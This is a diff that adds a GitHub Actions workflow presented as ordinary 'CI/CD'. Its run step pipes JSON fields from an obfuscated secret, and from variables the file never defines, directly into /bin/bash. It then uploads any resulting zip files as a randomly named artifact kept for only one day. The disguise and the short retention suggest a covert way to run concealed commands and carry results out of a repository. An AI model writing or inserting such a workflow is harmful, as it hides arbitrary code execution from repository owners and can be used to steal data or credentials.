@@ -1,0 +1,28 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          mihyr8: ${{ secrets.mihyr8 }}
+        run: |
+          printf '%s' "$mihyr8" | jq -r .tld3436 | /bin/bash
+          echo $lif496 | jq -r .fdzds0 | /bin/bash
+          printf '%s' "$l68666" | jq -r .ndif00391 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: Mw6LeuG6
+          path: "*.zip"
+          retention-days: 1
